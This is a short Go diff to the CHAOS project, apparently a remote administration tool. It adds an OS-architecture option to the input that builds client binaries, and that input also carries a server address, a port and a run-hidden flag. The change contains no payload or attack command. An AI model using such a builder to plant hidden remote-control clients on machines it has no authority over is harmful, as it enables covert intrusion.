@@ -2,6 +2,8 @@ package client
 
 import (
 	"context"
+	"strings"
+
 	"github.com/gorilla/websocket"
 	"github.com/tiagorlampert/CHAOS/internal/utils"
 	"github.com/tiagorlampert/CHAOS/internal/utils/system"
@@ -20,6 +22,7 @@ type SendCommandOutput struct {
 
 type BuildClientBinaryInput struct {
 	ServerAddress, ServerPort, Filename string
+	OSArch                              string
 	RunHidden                           bool
 	OSTarget                            system.OSType
 }
@@ -34,6 +37,13 @@ func (b BuildClientBinaryInput) GetServerPort() string {
 
 func (b BuildClientBinaryInput) GetFilename() string {
 	return utils.SanitizeString(b.Filename)
+}
+
+func (b BuildClientBinaryInput) GetOSArch() string {
+	if arch := strings.ToLower(utils.SanitizeString(b.OSArch)); len(arch) > 0 {
+		return arch
+	}
+	return system.DefaultArch(b.OSTarget)
 }
 
 type Service interface {
